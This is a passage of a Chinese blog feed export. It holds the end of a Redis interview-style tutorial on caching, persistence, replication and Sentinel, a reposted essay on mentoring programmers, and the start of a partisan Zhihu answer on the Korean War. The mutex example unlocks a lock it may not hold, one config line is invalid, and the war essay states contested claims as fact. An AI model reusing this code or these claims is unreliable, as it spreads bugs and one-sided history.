alt="img"></p><p>④再次调用查询接口，查询 id=4 的用户信息：</p><p><img src="/Redis/redis/redis-summary/v2-aef3746fcb2e9c332903439e6147a4cf_1440w.png" alt="img"></p><p>没有了缓存，所以进入了 get 方法，从 userMap 中获取。</p><p><strong>缓存注解</strong></p><p><strong>①@Cacheable</strong></p><p>根据方法的请求参数对其结果进行缓存：</p><ul><li><strong>Key：</strong>缓存的 Key，可以为空，如果指定要按照 SPEL 表达式编写，如果不指定，则按照方法的所有参数进行组合。</li><li><strong>Value：</strong>缓存的名称，必须指定至少一个（如 @Cacheable (value=’user’)或者 @Cacheable(value={‘user1’,’user2’})）</li><li><strong>Condition：</strong>缓存的条件，可以为空，使用 SPEL 编写，返回 true 或者 false，只有为 true 才进行缓存。</li></ul><p><strong>②@CachePut</strong></p><p>根据方法的请求参数对其结果进行缓存，和 @Cacheable 不同的是，它每次都会触发真实方法的调用。参数描述见上。</p><p><strong>③@CacheEvict</strong></p><p>根据条件对缓存进行清空：</p><ul><li>Key：同上。</li><li>Value：同上。</li><li>Condition：同上。</li><li>allEntries：是否清空所有缓存内容，缺省为 false，如果指定为 true，则方法调用后将立即清空所有缓存。</li><li><strong>beforeInvocation：</strong>是否在方法执行前就清空，缺省为 false，如果指定为 true，则在方法还没有执行的时候就清空缓存。缺省情况下，如果方法执行抛出异常，则不会清空缓存。</li></ul><p>缓存问题<br><strong>面试官：</strong>看了一下你的 Demo，简单易懂。那你在实际项目中使用缓存有遇到什么问题或者会遇到什么问题你知道吗？</p><p><strong>我：</strong>缓存和数据库数据一致性问题：分布式环境下非常容易出现缓存和数据库间数据一致性问题，针对这一点，如果项目对缓存的要求是强一致性的，那么就不要使用缓存。</p><p>我们只能采取合适的策略来降低缓存和数据库间数据不一致的概率，而无法保证两者间的强一致性。</p><p>合适的策略包括合适的缓存更新策略，更新数据库后及时更新缓存、缓存失败时增加重试机制。</p><p><strong>面试官：</strong>Redis 雪崩了解吗？</p><p><strong>我：</strong>我了解的，目前电商首页以及热点数据都会去做缓存，一般缓存都是定时任务去刷新，或者查不到之后去更新缓存的，定时任务刷新就有一个问题。</p><p>举个栗子：如果首页所有 Key 的失效时间都是 12 小时，中午 12 点刷新的，我零点有个大促活动大量用户涌入，假设每秒 6000 个请求，本来缓存可以抗住每秒 5000 个请求，但是缓存中所有 Key 都失效了。</p><p>此时 6000 个/秒的请求全部落在了数据库上，数据库必然扛不住，真实情况可能 DBA 都没反应过来直接挂了。</p><p>此时，如果没什么特别的方案来处理，DBA 很着急，重启数据库，但是数据库立马又被新流量给打死了。这就是我理解的缓存雪崩。</p><p><strong>我心想：</strong>同一时间大面积失效，瞬间 Redis 跟没有一样，那这个数量级别的请求直接打到数据库几乎是灾难性的。</p><p>你想想如果挂的是一个用户服务的库，那其他依赖他的库所有接口几乎都会报错。</p><p>如果没做熔断等策略基本上就是瞬间挂一片的节奏，你怎么重启用户都会把你打挂，等你重启好的时候，用户早睡觉去了，临睡之前，骂骂咧咧“什么垃圾产品”。</p><p><strong>面试官摸摸了自己的头发：</strong>嗯，还不错，那这种情况你都是怎么应对的？</p><p><strong>我：</strong>处理缓存雪崩简单，在批量往 Redis 存数据的时候，把每个 Key 的失效时间都加个随机值就好了，这样可以保证数据不会再同一时间大面积失效。</p><pre><code class="text">setRedis（key, value, time+Math.random()*10000）;</code></pre><p>如果 Redis 是集群部署，将热点数据均匀分布在不同的 Redis 库中也能避免全部失效。</p><p>或者设置热点数据永不过期，有更新操作就更新缓存就好了（比如运维更新了首页商品，那你刷下缓存就好了，不要设置过期时间），电商首页的数据也可以用这个操作，保险。</p><p><strong>面试官：</strong>那你了解缓存穿透和击穿么，可以说说他们跟雪崩的区别吗？</p><p><strong>我：</strong>嗯，了解，先说下缓存穿透吧，缓存穿透是指缓存和数据库中都没有的数据，而用户（黑客）不断发起请求。</p><p>举个栗子：我们数据库的 id 都是从 1 自增的，如果发起 id=-1 的数据或者 id 特别大不存在的数据，这样的不断攻击导致数据库压力很大，严重会击垮数据库。</p><p><strong>我又接着说：</strong>至于缓存击穿嘛，这个跟缓存雪崩有点像，但是又有一点不一样，缓存雪崩是因为大面积的缓存失效，打崩了 DB。</p><p>而缓存击穿不同的是缓存击穿是指一个 Key 非常热点，在不停地扛着大量的请求，大并发集中对这一个点进行访问，当这个 Key 在失效的瞬间，持续的大并发直接落到了数据库上，就在这个 Key 的点上击穿了缓存。</p><p><strong>面试官露出欣慰的眼光：</strong>那他们分别怎么解决？</p><p><strong>我：</strong>缓存穿透我会在接口层增加校验，比如用户鉴权，参数做校验，不合法的校验直接 return，比如 id 做基础校验，id&lt;=0 直接拦截。</p><p><strong>面试官：</strong>那你还有别的方法吗？</p><p><strong>我：</strong>我记得 Redis 里还有一个高级用法布隆过滤器（Bloom Filter）这个也能很好的预防缓存穿透的发生。</p><p>它的原理也很简单，就是利用高效的数据结构和算法快速判断出你这个 Key 是否在数据库中存在，不存在你 return 就好了，存在你就去查 DB 刷新 KV 再 return。</p><p>缓存击穿的话，设置热点数据永不过期，或者加上互斥锁就搞定了。作为暖男，代码给你准备好了，拿走不谢。</p><pre><code class="text">public static String getData(String key) throws InterruptedException {        //从Redis查询数据        String result = getDataByKV(key);        //参数校验        if (StringUtils.isBlank(result)) {            try {                //获得锁                if (reenLock.tryLock()) {                    //去数据库查询                    result = getDataByDB(key);                    //校验                    if (StringUtils.isNotBlank(result)) {                        //插进缓存                        setDataToKV(key, result);                    }                } else {                    //睡一会再拿                    Thread.sleep(100L);                    result = getData(key);                }            } finally {                //释放锁                reenLock.unlock();            }        }        return result;    }</code></pre><p><strong>面试官：</strong>嗯嗯，还不错。</p><p>Redis 为何这么快</p><p><strong>面试官：</strong>Redis 作为缓存大家都在用，那 Redis 一定很快咯？</p><p><strong>我：</strong>当然了，官方提供的数据可以达到 100000+ 的 QPS（每秒内的查询次数），这个数据不比 Memcached 差！</p><p><strong>面试官：</strong>Redis 这么快，它的“多线程模型”你了解吗？（露出邪魅一笑）</p><p><strong>我：</strong>您是想问 Redis 这么快，为什么还是单线程的吧。Redis 确实是单进程单线程的模型，因为 Redis 完全是基于内存的操作，CPU 不是 Redis 的瓶颈，Redis 的瓶颈最有可能是机器内存的大小或者网络带宽。</p><p>既然单线程容易实现，而且 CPU 不会成为瓶颈，那就顺理成章的采用单线程的方案了（毕竟采用多线程会有很多麻烦）。</p><p><strong>面试官：</strong>嗯，是的。那你能说说 Redis 是单线程的，为什么还能这么快吗？</p><p><strong>我：</strong>可以这么说吧，总结一下有如下四点：</p><ul><li>Redis 完全基于内存，绝大部分请求是纯粹的内存操作，非常迅速，数据存在内存中，类似于 HashMap，HashMap 的优势就是查找和操作的时间复杂度是 O(1)。</li><li>数据结构简单，对数据操作也简单。</li><li>采用单线程，避免了不必要的上下文切换和竞争条件，不存在多线程导致的 CPU 切换，不用去考虑各种锁的问题，不存在加锁释放锁操作，没有死锁问题导致的性能消耗。</li><li>使用多路复用 IO 模型，非阻塞 IO。</li></ul><p>Redis 和 Memcached 的区别</p><p><strong>面试官：</strong>嗯嗯，说的很详细。那你为什么选择 Redis 的缓存方案而不用 Memcached 呢？</p><p><strong>我：</strong>原因有如下四点：</p><ul><li><strong>存储方式上：</strong>Memcache 会把数据全部存在内存之中，断电后会挂掉，数据不能超过内存大小。Redis 有部分数据存在硬盘上，这样能保证数据的持久性。</li><li><strong>数据支持类型上：</strong>Memcache 对数据类型的支持简单，只支持简单的 key-value，，而 Redis 支持五种数据类型。</li><li><strong>使用底层模型不同：</strong>它们之间底层实现方式以及与客户端之间通信的应用协议不一样。Redis 直接自己构建了 VM 机制，因为一般的系统调用系统函数的话，会浪费一定的时间去移动和请求。</li><li><strong>Value 的大小：</strong>Redis 可以达到 1GB，而 Memcache 只有 1MB。</li></ul><p>淘汰策略</p><p><strong>面试官：</strong>那你说说你知道的 Redis 的淘汰策略有哪些？</p><p><strong>我：</strong>Redis 有六种淘汰策略，如下图：</p><p><img src="/Redis/redis/redis-summary/v2-10931268fb1a7c832c4933795d6a4e71_1440w.jpg" alt="img"></p><p><strong>补充一下：</strong>Redis 4.0 加入了 LFU（least frequency use）淘汰策略，包括 volatile-lfu 和 allkeys-lfu，通过统计访问频率，将访问频率最少，即最不经常使用的 KV 淘汰。</p><p>持久化</p><p><strong>面试官：</strong>你对 Redis 的持久化机制了解吗？能讲一下吗？</p><p><strong>我：</strong>Redis 为了保证效率，数据缓存在了内存中，但是会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件中，以保证数据的持久化。</p><p>Redis 的持久化策略有两种：</p><ul><li><strong>RDB：</strong>快照形式是直接把内存中的数据保存到一个 dump 的文件中，定时保存，保存策略。</li><li><strong>AOF：</strong>把所有的对 Redis 的服务器进行修改的命令都存到一个文件里，命令的集合。Redis 默认是快照 RDB 的持久化方式。</li></ul><p>当 Redis 重启的时候，它会优先使用 AOF 文件来还原数据集，因为 AOF 文件保存的数据集通常比 RDB 文件所保存的数据集更完整。你甚至可以关闭持久化功能，让数据只在服务器运行时存。</p><p><strong>面试官：</strong>那你再说下 RDB 是怎么工作的？</p><p><strong>我：</strong>默认 Redis 是会以快照”RDB”的形式将数据持久化到磁盘的一个二进制文件 dump.rdb。</p><p>工作原理简单说一下：当 Redis 需要做持久化时，Redis 会 fork 一个子进程，子进程将数据写到磁盘上一个临时 RDB 文件中。</p><p>当子进程完成写临时文件后，将原来的 RDB 替换掉，这样的好处是可以 copy-on-write。</p><p><strong>我：</strong>RDB 的优点是：这种文件非常适合用于备份：比如，你可以在最近的 24 小时内，每小时备份一次，并且在每个月的每一天也备份一个 RDB 文件。</p><p>这样的话，即使遇上问题，也可以随时将数据集还原到不同的版本。RDB 非常适合灾难恢复。</p><p>RDB 的缺点是：如果你需要尽量避免在服务器故障时丢失数据，那么RDB不合适你。</p><p><strong>面试官：</strong>那你要不再说下 AOF？</p><p><strong>我：</strong>（说就一起说下吧）使用 AOF 做持久化，每一个写命令都通过 write 函数追加到 appendonly.aof 中，配置方式如下：</p><pre><code class="text">appendfsync yes   appendfsync always     #每次有数据修改发生时都会写入AOF文件。appendfsync everysec   #每秒钟同步一次，该策略为AOF的缺省策略。</code></pre><p>AOF 可以做到全程持久化，只需要在配置中开启 appendonly yes。这样 Redis 每执行一个修改数据的命令，都会把它添加到 AOF 文件中，当 Redis 重启时，将会读取 AOF 文件进行重放，恢复到 Redis 关闭前的最后时刻。</p><p>我顿了一下，继续说：使用 AOF 的优点是会让 Redis 变得非常耐久。可以设置不同的 Fsync 策略，AOF的默认策略是每秒钟 Fsync 一次，在这种配置下，就算发生故障停机，也最多丢失一秒钟的数据。</p><p>缺点是对于相同的数据集来说，AOF 的文件体积通常要大于 RDB 文件的体积。根据所使用的 Fsync 策略，AOF 的速度可能会慢于 RDB。</p><p><strong>面试官又问：</strong>你说了这么多，那我该用哪一个呢？</p><p><strong>我：</strong>如果你非常关心你的数据，但仍然可以承受数分钟内的数据丢失，那么可以额只使用 RDB 持久。</p><p>AOF 将 Redis 执行的每一条命令追加到磁盘中，处理巨大的写入会降低Redis的性能，不知道你是否可以接受。</p><p>数据库备份和灾难恢复：定时生成 RDB 快照非常便于进行数据库备份，并且 RDB 恢复数据集的速度也要比 AOF 恢复的速度快。</p><p>当然了，Redis 支持同时开启 RDB 和 AOF，系统重启后，Redis 会优先使用 AOF 来恢复数据，这样丢失的数据会最少。</p><p><strong>主从复制</strong></p><p><strong>面试官：</strong>Redis 单节点存在单点故障问题，为了解决单点问题，一般都需要对 Redis 配置从节点，然后使用哨兵来监听主节点的存活状态，如果主节点挂掉，从节点能继续提供缓存功能，你能说说 Redis 主从复制的过程和原理吗？</p><p>我有点懵，这个说来就话长了。但幸好提前准备了：主从配置结合哨兵模式能解决单点故障问题，提高 Redis 可用性。</p><p>从节点仅提供读操作，主节点提供写操作。对于读多写少的状况，可给主节点配置多个从节点，从而提高响应效率。</p><p><strong>我顿了一下，接着说：</strong>关于复制过程，是这样的：</p><ul><li>从节点执行 slaveof[masterIP][masterPort]，保存主节点信息。</li><li>从节点中的定时任务发现主节点信息，建立和主节点的 Socket 连接。</li><li>从节点发送 Ping 信号，主节点返回 Pong，两边能互相通信。</li><li>连接建立后，主节点将所有数据发送给从节点（数据同步）。</li><li>主节点把当前的数据同步给从节点后，便完成了复制的建立过程。接下来，主节点就会持续的把写命令发送给从节点，保证主从数据一致性。</li></ul><p><strong>面试官：</strong>那你能详细说下数据同步的过程吗？</p><p>（我心想：这也问的太细了吧）我：可以。Redis 2.8 之前使用 sync[runId][offset] 同步命令，Redis 2.8 之后使用 psync[runId][offset] 命令。</p><p>两者不同在于，Sync 命令仅支持全量复制过程，Psync 支持全量和部分复制。</p><p>介绍同步之前，先介绍几个概念：</p><ul><li><strong>runId：</strong>每个 Redis 节点启动都会生成唯一的 uuid，每次 Redis 重启后，runId 都会发生变化。</li><li><strong>offset：</strong>主节点和从节点都各自维护自己的主从复制偏移量 offset，当主节点有写入命令时，offset=offset+命令的字节长度。<br>从节点在收到主节点发送的命令后，也会增加自己的 offset，并把自己的 offset 发送给主节点。<br>这样，主节点同时保存自己的 offset 和从节点的 offset，通过对比 offset 来判断主从节点数据是否一致。</li><li><strong>repl_backlog_size：</strong>保存在主节点上的一个固定长度的先进先出队列，默认大小是 1MB。</li></ul><p>主节点发送数据给从节点过程中，主节点还会进行一些写操作，这时候的数据存储在复制缓冲区中。</p><p>从节点同步主节点数据完成后，主节点将缓冲区的数据继续发送给从节点，用于部分复制。</p><p>主节点响应写命令时，不但会把命名发送给从节点，还会写入复制积压缓冲区，用于复制命令丢失的数据补救。</p><p><img src="/Redis/redis/redis-summary/v2-1654bf274fa7005445fae6f884b547df_1440w.jpg" alt="img"></p><p>上面是 Psync 的执行流程，从节点发送 psync[runId][offset] 命令，主节点有三种响应：</p><ul><li><strong>FULLRESYNC：</strong>第一次连接，进行全量复制</li><li><strong>CONTINUE：</strong>进行部分复制</li><li><strong>ERR：</strong>不支持 psync 命令，进行全量复制</li></ul><p><strong>面试官：</strong>很好，那你能具体说下全量复制和部分复制的过程吗？</p><p><strong>我：</strong>可以！</p><p><img src="/Redis/redis/redis-summary/v2-f97625e47cf8105533113717d55602fd_1440w.jpg" alt="img"></p><p>上面是全量复制的流程。主要有以下几步：</p><ul><li>从节点发送 psync ? -1 命令（因为第一次发送，不知道主节点的 runId，所以为?，因为是第一次复制，所以 offset=-1）。</li><li>主节点发现从节点是第一次复制，返回 FULLRESYNC {runId} {offset}，runId 是主节点的 runId，offset 是主节点目前的 offset。</li><li>从节点接收主节点信息后，保存到 info 中。</li><li>主节点在发送 FULLRESYNC 后，启动 bgsave 命令，生成 RDB 文件（数据持久化）。</li><li>主节点发送 RDB 文件给从节点。到从节点加载数据完成这段期间主节点的写命令放入缓冲区。</li><li>从节点清理自己的数据库数据。</li><li>从节点加载 RDB 文件，将数据保存到自己的数据库中。如果从节点开启了 AOF，从节点会异步重写 AOF 文件。</li></ul><p>关于部分复制有以下几点说明：</p><p>①部分复制主要是 Redis 针对全量复制的过高开销做出的一种优化措施，使用 psync[runId][offset] 命令实现。</p><p>当从节点正在复制主节点时，如果出现网络闪断或者命令丢失等异常情况时，从节点会向主节点要求补发丢失的命令数据，主节点的复制积压缓冲区将这部分数据直接发送给从节点。</p><p>这样就可以保持主从节点复制的一致性。补发的这部分数据一般远远小于全量数据。</p><p>②主从连接中断期间主节点依然响应命令，但因复制连接中断命令无法发送给从节点，不过主节点内的复制积压缓冲区依然可以保存最近一段时间的写命令数据。</p><p>③当主从连接恢复后，由于从节点之前保存了自身已复制的偏移量和主节点的运行 ID。因此会把它们当做 psync 参数发送给主节点，要求进行部分复制。</p><p>④主节点接收到 psync 命令后首先核对参数 runId 是否与自身一致，如果一致，说明之前复制的是当前主节点。</p><p>之后根据参数 offset 在复制积压缓冲区中查找，如果 offset 之后的数据存在，则对从节点发送+COUTINUE 命令，表示可以进行部分复制。因为缓冲区大小固定，若发生缓冲溢出，则进行全量复制。</p><p>⑤主节点根据偏移量把复制积压缓冲区里的数据发送给从节点，保证主从复制进入正常状态。</p><p>哨兵</p><p><strong>面试官：</strong>那主从复制会存在哪些问题呢？</p><p><strong>我：</strong>主从复制会存在以下问题：</p><ul><li>一旦主节点宕机，从节点晋升为主节点，同时需要修改应用方的主节点地址，还需要命令所有从节点去复制新的主节点，整个过程需要人工干预。</li><li>主节点的写能力受到单机的限制。</li><li>主节点的存储能力受到单机的限制。</li><li>原生复制的弊端在早期的版本中也会比较突出，比如：Redis 复制中断后，从节点会发起 psync。<br>此时如果同步不成功，则会进行全量同步，主库执行全量备份的同时，可能会造成毫秒或秒级的卡顿。</li></ul><p><strong>面试官：</strong>那比较主流的解决方案是什么呢？</p><p><strong>我：</strong>当然是哨兵啊。</p><p><strong>面试官：</strong>那么问题又来了。那你说下哨兵有哪些功能？</p><p><img src="/Redis/redis/redis-summary/v2-164bb28b17f29cbee1deef58e070771a_1440w.jpg" alt="img"></p><p><strong>我：</strong>如图，是 Redis Sentinel（哨兵）的架构图。Redis Sentinel（哨兵）主要功能包括主节点存活检测、主从运行情况检测、自动故障转移、主从切换。</p><p>Redis Sentinel 最小配置是一主一从。Redis 的 Sentinel 系统可以用来管理多个 Redis 服务器。</p><p>该系统可以执行以下四个任务：</p><ul><li><strong>监控：</strong>不断检查主服务器和从服务器是否正常运行。</li><li><strong>通知：</strong>当被监控的某个 Redis 服务器出现问题，Sentinel 通过 API 脚本向管理员或者其他应用程序发出通知。</li><li><strong>自动故障转移：</strong>当主节点不能正常工作时，Sentinel 会开始一次自动的故障转移操作，它会将与失效主节点是主从关系的其中一个从节点升级为新的主节点，并且将其他的从节点指向新的主节点，这样人工干预就可以免了。</li><li><strong>配置提供者：</strong>在 Redis Sentinel 模式下，客户端应用在初始化时连接的是 Sentinel 节点集合，从中获取主节点的信息。</li></ul><p><strong>面试官：</strong>那你能说下哨兵的工作原理吗？</p><p><strong>我：</strong>话不多说，直接上图：</p><p><img src="/Redis/redis/redis-summary/v2-04a114734e7c5d1032675417c013d504_1440w.jpg" alt="img"></p><p>①每个 Sentinel 节点都需要定期执行以下任务：每个 Sentinel 以每秒一次的频率，向它所知的主服务器、从服务器以及其他的 Sentinel 实例发送一个 PING 命令。（如上图）</p><p><img src="/Redis/redis/redis-summary/v2-93bef86d7da374db7e5b34590f94a88e_1440w.jpg" alt="img"></p><p>②如果一个实例距离最后一次有效回复 PING 命令的时间超过 down-after-milliseconds 所指定的值，那么这个实例会被 Sentinel 标记为主观下线。（如上图）</p><p><img src="/Redis/redis/redis-summary/v2-47dbd4fba83494b14c0c36f4fc2cef16_1440w.jpg" alt="img"></p><p>③如果一个主服务器被标记为主观下线，那么正在监视这个服务器的所有 Sentinel 节点，要以每秒一次的频率确认主服务器的确进入了主观下线状态。</p><p><img src="/Redis/redis/redis-summary/v2-aaa116b0afc8ce6109cf2e968bf67369_1440w.jpg" alt="img"></p><p>④如果一个主服务器被标记为主观下线，并且有足够数量的 Sentinel（至少要达到配置文件指定的数量）在指定的时间范围内同意这一判断，那么这个主服务器被标记为客观下线。</p><p><img src="/Redis/redis/redis-summary/v2-87ee8a63d7d76f5fd203fba4803682a2_1440w.jpg" alt="img"></p><p>⑤一般情况下，每个 Sentinel 会以每 10 秒一次的频率向它已知的所有主服务器和从服务器发送 INFO 命令。</p><p>当一个主服务器被标记为客观下线时，Sentinel 向下线主服务器的所有从服务器发送 INFO 命令的频率，会从 10 秒一次改为每秒一次。</p><p><img src="/Redis/redis/redis-summary/v2-bcd1b109fb0485ebfa4b31facc15b264_1440w.jpg" alt="img"></p><p>⑥Sentinel 和其他 Sentinel 协商客观下线的主节点的状态，如果处于 SDOWN 状态，则投票自动选出新的主节点，将剩余从节点指向新的主节点进行数据复制。</p><p><img src="/Redis/redis/redis-summary/v2-b42582e533f89916ca21ed866673a59b_1440w.jpg" alt="img"></p><p>⑦当没有足够数量的 Sentinel 同意主服务器下线时，主服务器的客观下线状态就会被移除。</p><p>当主服务器重新向 Sentinel 的 PING 命令返回有效回复时，主服务器的主观下线状态就会被移除。</p><p><strong>面试官：</strong>不错，面试前没少下工夫啊，今天 Redis 这关你过了，明天找个时间我们再聊聊其他的。（露出欣慰的微笑）</p><p><strong>我：</strong>没问题。</p><p><strong>总结</strong></p><p>本文在一次面试的过程中讲述了 Redis 是什么，Redis 的特点和功能，Redis 缓存的使用，Redis 为什么能这么快，Redis 缓存的淘汰策略，持久化的两种方式，Redis 高可用部分的主从复制和哨兵的基本原理。</p>]]></content>
      
      
      <categories>
          
          <category> Redis </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>【佳作分析】 一个小道理的文章</title>
      <link href="/%E5%86%99%E4%BD%9C%E6%8A%80%E5%B7%A7/writing/we-it/"/>
      <url>/%E5%86%99%E4%BD%9C%E6%8A%80%E5%B7%A7/writing/we-it/</url>
      
        <content type="html"><![CDATA[<p>作者：纯洁的微笑<br>链接：<a href="https://zhuanlan.zhihu.com/p/149160706" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/149160706</a><br>来源：知乎<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p><p>1、<strong>竞争</strong></p><p>早年我刚做程序员的时候，经常喜欢上一个网站叫做 CSDN，特别是 CSDN 的论坛吹水区，几乎每天都看？</p><p>当时的 CSDN 论坛吹水区，几乎是当时中国程序员最活跃的地方，有很多大神在其中出没，分享自己的经历和故事。</p><p>当然还有很多新人在这个版块问：程序员这个行业有前途吗？</p><p>那时候程序员群体还很少，记得有一个家伙，每次都会活跃在这类问题下，给新人回答说，程序员这个行业多苦逼呀，压力大青春活工资低！</p><p>后来有一天，我和这个家伙刚好都在一个程序员的QQ群中，他在群里号召大家一定给新人说程序员这个行业有多么的苦逼。</p><p>这样的目的是，让更少的程序员进入这个行业，从而减少他的竞争力，这样就可以躺着赚钱了。</p><p>诚然，个人是不能抵挡潮流的，现在程序员肯定是越来越多…</p><p>2、<strong>留一手</strong></p><p>这样的人现在还存在，但毕竟太少了。</p><p>但在程序员行业中，仍然有一部分人存在这样的观念：教会徒弟，饿死师傅！</p><p>我只能用2个字来回复他：<strong>愚蠢</strong>！</p><p><img src="/写作技巧/writing/we-it/v2-9b1bf552c15958ce52fcddfa1e157d85_b.jpg" alt="img"></p><p>在中国古代或者传统行业中，一直流传着这句话，所以做师傅的经常喜欢留一手，把自己最关键或者绝活的东西不交给徒弟。</p><p>传统的手艺人，害怕徒弟掌握了技能之后，会给自己创造一个不必要的竞争对手，大可理解 。</p><p>但如果做为IT行业人才，还抱着这样的想法来做事情，那就真的太愚昧了。</p><p>3、<strong>共赢</strong></p><p>我在互联网行业从业十几年，遇到了很多厉害的“师傅”，也带过几个年轻人，所以对于教会徒弟是否会饿死师傅，还是有一点经验的。</p><p>首先是，就算你不教，徒弟就学不会吗？</p><p>现在互联网资料这么发达，基本上难不住一个想学习的人，只不过是让新人会多走一些弯路罢了。</p><p>这样只能让别人和你产生了距离，不利于同事交往。</p><p>第二，职场里面喜欢帮别人解决问题的人，基本上就是技术牛X的人。</p><p>高效学习分为几个层级，其中学习效率最高的就是教会别人.</p><p>新人的问题会耽误你的时间，但从某种程度来讲反而也促进了你的技术，让你可以了解到更多问题样本，提高了解决问题的能力。</p><p>大家在职场也可以发现，基本上经常帮大家解决问题的人，都是公司的里面的技术大牛，或者能力出众的同事。</p><p>第三，教会新人，你才有精力做更核心的内容。</p><p>一些新晋级的管理者，总害怕放权，总想自己手上抓住点什么，最后的结果是事情也没干好，管理也没协调好。</p><p>很多公司晋升的条件之一，就是能够找到一个人来替代你，这样你才可以晋升去做更核心的内容。</p><p>教会徒弟，才有时间把最核心的事情做好！所以帮助新人成长其实是一个共赢的事情。</p><p>4、<strong>最后</strong></p><p>记住，这个世界上，人们都喜欢和大气的人在一起玩。</p><p>在职场更是，害怕“教会徒弟，饿死师傅”，本来就是一种弱者心态，害怕失去手中抓住的那点东西。</p><p>其实这个世界很大，探索更广阔的世界，比守住自己那点东西，更有力量更有前景！</p><p>当然做徒弟的也需要明白，没有人是应该要教会你的，在社会上任何人的帮助都应该忠心的感谢！</p><p><strong>帮你是情分，不帮你是本分！</strong></p><p>师傅和徒弟的关系，在现在的社会已经没有那么重，正是因为学习的方式和途径更多元化，没有人必须需要依靠一个人！</p><p>现在的社会，师傅和徒弟的关系最佳可能是<strong>朋友</strong>！</p><hr><p>分析：</p><ul><li><strong>用于讲道理的写作范式</strong></li><li>通俗</li><li>容易理解，没有距离感</li><li>像是和朋友聊天，读起来不累</li><li>一个简单的道理，可以写出 1000 字左右</li></ul>]]></content>
      
      
      <categories>
          
          <category> 写作技巧 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>【佳作分析】 如何评价朝鲜战争及其影响？</title>
      <link href="/%E5%86%99%E4%BD%9C%E6%8A%80%E5%B7%A7/writing/writing-example-chaoxian/"/>
      <url>/%E5%86%99%E4%BD%9C%E6%8A%80%E5%B7%A7/writing/writing-example-chaoxian/</url>
      
        <content type="html"><![CDATA[<p>作者：王一点寒<br>链接：<a href="https://www.zhihu.com/question/41572022/answer/1253129190" target="_blank" rel="noopener">https://www.zhihu.com/question/41572022/answer/1253129190</a><br>来源：知乎<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p><p>叶问初到香港，要开武馆授徒。怎么才能开？得挨家挨户拜山头，全打一遍。</p><p>建国也一样。不是你说建就建，大家都相安无事了。也得可着那些不服的全打一遍，打服了，你才能建起来。抗美援朝就是这样一场战争。</p><p>毛主席1949年10月1日宣布中华人民共和国成立了。什么意思？告诉全世界，这片地方以后我罩着了，这里的土地是我的，人口是我的，以后资源我开采，税收我拿着，谁想来得我同意。</p><p>你是宣布了，可别人怎么就那么不信呢？土地，人口，那都是白花花的银子啊，你说是你的就是你的？我还说是我的呢。别给我整什么自古以来，自古以来还特么都是你的呢。</p><p>主席宣布新中国成立的时候，南方还在打着仗，解放战争还没有完全结束。也就是说，国是建了，可这国境线还没确定最终能推进到哪。海南，西藏，那都是建国后才解放的。这国境线怎么确定？一靠谈，二靠打。就好像印度，你建国时人家也建国了，你在用你的军队试探着你能伸张的最大地盘，印度也想看看自己能有几斤几两。你说你NB，我特么把大英帝国都干趴下了。你说应该按以前的疆域，我继承自英国就得按麦克马洪线，另外西藏信佛，也得在我的保护之下才行。</p><p>所以，一个国家要建立，并不是说说就够了，你必须要拿出能让人信服的东西。什么东西？拳头。</p><p>美国现在NB，当年建国也跟周边国家打了一圈，拜完了山头才算完啊。没有一个国家不是这样。你看历史疆域演变，哪怕汉唐，那疆域都是动态的，更别说其他朝代了。为什么是动态变化的？因为有国境线就意味着有两国实力的比拼，不管是东风压倒西风还是西风压倒东风，只要没平衡，国境线就会变动。</p><p>朝鲜这块也一样，你建国了，可朝鲜还没消停啊，你说国境线就鸭绿江吧，鸭绿江那边就给小金子就行，可美国人不答应啊。美国人说我要给小李子。怎么办？打吧。可小李子打不过小金子，美国人绷不住了，亲自出马了。说好了让小孩子自己解决纠纷的，你这大人也上手算什么？上手就上手吧，还是一群大人群殴我家孩子一个，真当我是空气啊？于是开打。为什么要开打？你不打鸭绿江也保不住。打来打去，在三八线稳定住了，一场上甘岭，无论弹药量，战役规模，惨烈程度，都达到了新的高度，让美国人意识到，他的能力就仅限于此了。那就停战吧。这一停战，就代表了一种力量均衡。新中国到底有几斤几两全世界都知道了。</p><p>人家叶师傅把香港有头有脸的师傅一次性打了个遍，你香港师傅群殴都没占人便宜，能不让人开武馆吗？</p><p>所以，为什么说抗美援朝是立国之战？解放战争只是内斗，在自己家里看看到底谁功夫好，谁能当掌门。掌门决出来了，不代表你就可以开山立派了，还得道上的兄弟认可你才行，这抗美援朝就是在江湖上算是插上了一面旗，还不是普通的旗，是乔峰和叶问一样出场即巅峰的齐天大圣的旗。</p><p>你问为什么世界上有头有脸的人都认可了，印度还要来打？很简单，印度不是有头有脸的人，人李云龙急眼了连县城都敢打，你谢宝庆怎么那么不知好歹？印度也一样，初生牛犊不怕虎，一股子愣劲儿没处发泄，不到社会上吃点苦不知道成长，这就是没有底蕴的坏处，掂量不清自己和别人的斤两。觉得自己把大英帝国都赶跑了，又有美苏两大国在后唆使，就欲火焚身按捺不住了。年轻，还是图样图森破。后来吃了亏了，老实了。知道自己几斤几两了。原来自己拼尽全力的一击，连别人的毛都打不着。于是也老实了。</p><p>越南呢？更NB。你中国跟美国打个平手，我把美国打败了啊，我绝逼比你强啊。于是呢，跟印度一样，患上了大国恐惧症。</p><p>从越南也可以看出，抗美援朝的影响之一，就是避免了至少一场中朝边界的军事冲突。一个统一的朝鲜，不管是姓共还是姓资，也早晚有一天要试探一下自己的能力。</p><p>要说抗美援朝的最大影响，自然是在世界上打出了名堂，立住了门派。</p><p>但这场战争的影响却绝不仅仅是这些。大部分人都低估了这场战争的影响。</p><p>比如，我们用抗美援朝的战俘换来了钱学森。美国人说他顶五个师。现在看来，美国人是对的，钱学森确实顶五个外星人师团。</p><p>比如，我们用抗美援朝换来了东北的绝对安全，从而可以依托东北靠近苏联和本来就不错的工业底子来搞工业化。可以说我们今天的工业化，世界工厂都是抗美援朝打出来的装备。没有这些，自然也就无所谓什么改革开放了，没有工业你开的什么放？搞旅游？还是特殊服务？</p><p>比如，我们用抗美援朝换来了苏联的大量军事援助，使得军队装备水平得到了长足发展，我们的军事工业也得以起步，开始仿制各种装备。</p><p>比如，我们用抗美援朝换来了朝鲜牌，在美国让我们不爽的时候，可以有一些制约，让朝鲜射个导弹，搞个实验什么的。</p><p>在抗美援朝之前，我们被人按着摩擦了一百年，民族自信全失。抗美援朝，不仅让别人看清了我们的斤两，我们自己也看清了自己的斤两。原来，